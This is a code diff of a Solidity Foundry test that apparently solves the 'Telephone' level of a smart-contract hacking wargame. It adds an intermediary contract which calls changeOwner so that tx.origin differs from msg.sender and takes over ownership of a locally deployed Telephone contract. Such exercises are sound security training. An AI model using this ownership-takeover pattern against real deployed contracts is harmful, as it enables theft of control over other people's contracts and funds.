@@ -6,26 +6,43 @@ import {Telephone} from "../src/level-4_Telephone.sol";
 
 contract Origin
 {
+  error badOwner();
+
   Telephone tl;
   address public owner;
+  address public user;
 
-  constructor()
+  constructor(address _user)
+  {
     owner = msg.sender;
+    user = _user;
+    tl = new Telephone();
+  }
 
-  vm.prank(msg.sender);
-  tl = new Telephone();
-
+  function isOwner() public
+  {
+    if (tl.owner() == user)
+      revert badOwner();
+    tl.changeOwner(user);
+    if (tl.owner() != user)
+      revert badOwner();
+  }
 }
 
 contract TelephoneExploit is Test
 {
   Origin  or;
-  address user1;
+  address user;
 
-  function setUp()
+  function setUp() public
   {
-    user1 = makeAddr("user1");
-    vm.prank(user1);
-    or = new Origin();
+    user = makeAddr("user");
+    vm.prank(user);
+    or = new Origin(user);
+  }
+
+  function testExploit() public
+  {
+    or.isOwner();
   }
 }
